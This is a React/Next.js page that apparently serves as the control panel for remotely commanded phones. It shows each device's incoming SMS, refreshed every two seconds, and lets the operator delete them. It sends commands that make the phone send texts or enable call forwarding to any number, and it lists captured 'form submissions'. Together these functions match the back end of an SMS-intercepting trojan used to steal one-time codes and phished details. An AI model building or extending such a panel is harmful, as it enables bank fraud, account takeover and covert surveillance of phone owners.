"use client"

import type React from "react"

import { useEffect, useState, use } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { ArrowLeft, Trash2 } from "lucide-react"
import { useRouter } from "next/navigation"

interface SMS {
  id: number
  sender: string
  message_body: string
  received_at: string
}

interface FormSubmission {
  id: number
  custom_data: string
  submitted_at: string
}

export default function DeviceControl({ params }: { params: Promise<{ deviceId: string }> }) {
  const { deviceId } = use(params)
  const router = useRouter()
  const [smsLogs, setSmsLogs] = useState<SMS[]>([])
  const [forms, setForms] = useState<FormSubmission[]>([])
  const [showSmsDialog, setShowSmsDialog] = useState(false)
  const [showCallDialog, setShowCallDialog] = useState(false)
  const [showFormsDialog, setShowFormsDialog] = useState(false)

  // SMS form state
  const [smsPhone, setSmsPhone] = useState("")
  const [smsMessage, setSmsMessage] = useState("")
  const [smsSimSlot, setSmsSimSlot] = useState("0")

  // Call forwarding state
  const [callForwardNumber, setCallForwardNumber] = useState("")
  const [callSimSlot, setCallSimSlot] = useState("0")

  const fetchSmsLogs = async () => {
    try {
      const res = await fetch(`/api/device/${deviceId}/sms`)
      const data = await res.json()
      setSmsLogs(data)
    } catch (error) {
      console.error("Failed to fetch SMS logs:", error)
    }
  }

  const fetchForms = async () => {
    try {
      const res = await fetch(`/api/device/${deviceId}/forms`)
      const data = await res.json()
      setForms(data)
    } catch (error) {
      console.error("Failed to fetch forms:", error)
    }
  }

  useEffect(() => {
    fetchSmsLogs()
    // Auto-refresh SMS every 2 seconds
    const interval = setInterval(fetchSmsLogs, 2000)
    return () => clearInterval(interval)
  }, [deviceId])

  const handleSendSms = async () => {
    try {
      await fetch("/api/command/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          device_id: deviceId,
          command_type: "send_sms",
          command_data: {
            phone_number: smsPhone,
            message: smsMessage,
            sim_slot: Number.parseInt(smsSimSlot),
          },
        }),
      })
      setShowSmsDialog(false)
      setSmsPhone("")
      setSmsMessage("")
      setSmsSimSlot("0")
    } catch (error) {
      console.error("Failed to send SMS command:", error)
    }
  }

  const handleCallForwarding = async (action: "enable" | "disable") => {
    try {
      await fetch("/api/command/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          device_id: deviceId,
          command_type: "call_forward",
          command_data: {
            action,
            forward_number: callForwardNumber,
            sim_slot: Number.parseInt(callSimSlot),
          },
        }),
      })
      setShowCallDialog(false)
      setCallForwardNumber("")
      setCallSimSlot("0")
    } catch (error) {
      console.error("Failed to send call forward command:", error)
    }
  }

  const handleDeleteSms = async (smsId: number, e: React.MouseEvent) => {
    e.stopPropagation()
    try {
      await fetch(`/api/sms/${smsId}`, {
        method: "DELETE",
      })
      fetchSmsLogs()
    } catch (error) {
      console.error("Failed to delete SMS:", error)
    }
  }

  const handleGetForms = () => {
    fetchForms()
    setShowFormsDialog(true)
  }

  return (
    <div className="min-h-screen bg-black text-white p-4 md:p-6">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <div className="space-y-4">
          <Button variant="ghost" onClick={() => router.push("/")} className="text-zinc-400 hover:text-white">
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Dashboard
          </Button>
          <div className="text-center">
            <h1 className="text-3xl md:text-4xl font-bold mb-2 bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
              Device Control
            </h1>
            <p className="text-zinc-400 break-all">Controlling: {deviceId}</p>
          </div>
        </div>

        {/* Control Buttons */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Button
            onClick={handleGetForms}
            className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 rounded-full"
          >
            GET FORMS
          </Button>
          <Button
            onClick={() => setShowSmsDialog(true)}
            className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 rounded-full"
          >
            SEND SMS
          </Button>
          <Button
            onClick={() => setShowCallDialog(true)}
            className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 rounded-full"
          >
            CALL FORWARDING
          </Button>
        </div>

        {/* SMS Logs */}
        <div className="space-y-4">
          <h2 className="text-xl font-semibold">Received SMS</h2>
          {smsLogs.length === 0 ? (
            <Card className="bg-zinc-900 border-zinc-800 p-6 text-center text-zinc-400">No SMS Found</Card>
          ) : (
            smsLogs.map((sms) => (
              <Card key={sms.id} className="bg-zinc-900 border-zinc-800 p-4">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex-1 space-y-2">
                    <div className="flex items-center justify-between flex-wrap gap-2">
                      <p className="font-semibold text-blue-400">{sms.sender}</p>
                      <span className="text-xs text-zinc-500">{new Date(sms.received_at).toLocaleString()}</span>
                    </div>
                    <p className="text-sm text-zinc-300 break-words">{sms.message_body}</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="icon"
                    onClick={(e) => handleDeleteSms(sms.id, e)}
                    className="text-red-400 hover:text-red-300 hover:bg-red-500/10 flex-shrink-0"
                  >
                    <Trash2 className="w-4 h-4" />
                  </Button>
                </div>
              </Card>
            ))
          )}
        </div>
      </div>

      {/* Send SMS Dialog */}
      <Dialog open={showSmsDialog} onOpenChange={setShowSmsDialog}>
        <DialogContent className="bg-zinc-900 border-zinc-800 text-white">
          <DialogHeader>
            <DialogTitle>Send SMS Command</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="phone">Phone Number</Label>
              <Input
                id="phone"
                placeholder="+919876543210"
                value={smsPhone}
                onChange={(e) => setSmsPhone(e.target.value)}
                className="bg-zinc-800 border-zinc-700"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="message">SMS Message</Label>
              <Textarea
                id="message"
                placeholder="Enter your message"
                value={smsMessage}
                onChange={(e) => setSmsMessage(e.target.value)}
                className="bg-zinc-800 border-zinc-700 min-h-[100px]"
              />
            </div>
            <div className="space-y-2">
              <Label>SIM Slot</Label>
              <RadioGroup value={smsSimSlot} onValueChange={setSmsSimSlot}>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="0" id="sms-sim1" />
                  <Label htmlFor="sms-sim1" className="font-normal">
                    SIM 1
                  </Label>
                </div>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="1" id="sms-sim2" />
                  <Label htmlFor="sms-sim2" className="font-normal">
                    SIM 2
                  </Label>
                </div>
              </RadioGroup>
            </div>
          </div>
          <DialogFooter className="flex-col sm:flex-row gap-2">
            <Button variant="outline" onClick={() => setShowSmsDialog(false)} className="w-full sm:w-auto">
              CANCEL
            </Button>
            <Button onClick={handleSendSms} className="w-full sm:w-auto bg-gradient-to-r from-blue-600 to-cyan-600">
              SEND SMS
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Call Forwarding Dialog */}
      <Dialog open={showCallDialog} onOpenChange={setShowCallDialog}>
        <DialogContent className="bg-zinc-900 border-zinc-800 text-white">
          <DialogHeader>
            <DialogTitle>Call Forwarding</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="forward">Forwarding Number</Label>
              <Input
                id="forward"
                placeholder="+919876543210"
                value={callForwardNumber}
                onChange={(e) => setCallForwardNumber(e.target.value)}
                className="bg-zinc-800 border-zinc-700"
              />
            </div>
            <div className="space-y-2">
              <Label>SIM Slot</Label>
              <RadioGroup value={callSimSlot} onValueChange={setCallSimSlot}>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="0" id="call-sim1" />
                  <Label htmlFor="call-sim1" className="font-normal">
                    SIM 1
                  </Label>
                </div>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="1" id="call-sim2" />
                  <Label htmlFor="call-sim2" className="font-normal">
                    SIM 2
                  </Label>
                </div>
              </RadioGroup>
            </div>
          </div>
          <DialogFooter className="flex-col sm:flex-row gap-2">
            <Button
              onClick={() => handleCallForwarding("enable")}
              className="w-full sm:w-auto bg-gradient-to-r from-green-600 to-emerald-600"
            >
              ACTIVATE
            </Button>
            <Button
              onClick={() => handleCallForwarding("disable")}
              className="w-full sm:w-auto bg-gradient-to-r from-red-600 to-rose-600"
            >
              DEACTIVATE
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Forms Dialog */}
      <Dialog open={showFormsDialog} onOpenChange={setShowFormsDialog}>
        <DialogContent className="bg-zinc-900 border-zinc-800 text-white max-w-2xl max-h-[80vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Form Submissions</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            {forms.length === 0 ? (
              <p className="text-center text-zinc-400">No form submissions found</p>
            ) : (
              forms.map((form) => (
                <Card key={form.id} className="bg-zinc-800 border-zinc-700 p-4">
                  <div className="space-y-2">
                    <p className="text-xs text-zinc-500">{new Date(form.submitted_at).toLocaleString()}</p>
                    <pre className="text-sm text-zinc-300 whitespace-pre-wrap break-words">{form.custom_data}</pre>
                  </div>
                </Card>
              ))
            )}
          </div>
          <DialogFooter>
            <Button onClick={() => setShowFormsDialog(false)} className="w-full">
              CLOSE
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  )
}
